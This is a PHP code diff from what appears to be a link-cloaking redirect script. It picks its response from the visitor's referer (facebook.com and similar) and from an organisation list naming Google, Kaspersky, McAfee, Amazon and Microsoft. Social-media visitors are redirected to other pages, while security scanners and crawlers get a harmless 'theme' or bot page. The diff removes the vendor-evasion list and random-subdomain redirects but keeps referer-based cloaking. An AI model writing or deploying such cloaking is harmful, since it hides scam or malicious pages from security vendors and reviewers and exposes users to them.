@@ -41,27 +41,11 @@
 
   if($action == 'site'){
     $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-    $refs = array('facebook.com', 'uye.io', 'googleapis.com', 'blogspot.', 't.co', 'googleusercontent.com', 'herokuapp.com');
+    $refs = array('facebook.com');
     $action = 'theme';
     foreach ($refs as $ref) {
       if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
         $action = 'site';
-        break;
-      }
-    }
-  }
-
-  if($action == 'site'){
-    $asnlist = array('facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation');
-  }else if($action == 'mobile'){
-    $asnlist = array('facebook','linode','kaspersy','mcafee','amazon','microsoft corporation');
-  }
-
-  if($action != 'theme'){
-    $_SERVER['GEOIP_ORG'] = isset($_SERVER['GEOIP_ORG']) ? $_SERVER['GEOIP_ORG'] : '';
-    foreach ($asnlist as $asn) {
-      if(strpos(strtolower($_SERVER['GEOIP_ORG']), $asn) !== false){
-        $action = 'theme';
         break;
       }
     }
@@ -95,22 +79,11 @@
 
   if($action == 'mobile'){
     header('Location: https://goo.gl/c1u740');
-    //require_once('includes/log.php');
   }else if($action == 'site'){
-    require_once('includes/config.php');
-    if(strrpos($_SERVER['HTTP_HOST'], $app_site) === false){
-      $filename = generate_name(rand(5,8)).'.html';
-      header('Location:http://'.generate_name(rand(5,8)).'.'.$app_site.'/'.$id);
-      //require_once('includes/log.php');
-    }else{
-      require_once('youtube.php');
-    }
+    header('Location: /redirect.php');
   }else{
-    //require_once('includes/log.php');
     @ob_end_clean();
     @ob_end_flush();
     require_once('bot.php');
-    //header("HTTP/1.1 301");
-    //header("Location:http://www.deezer.com/track/".$id);
   }
 ?>
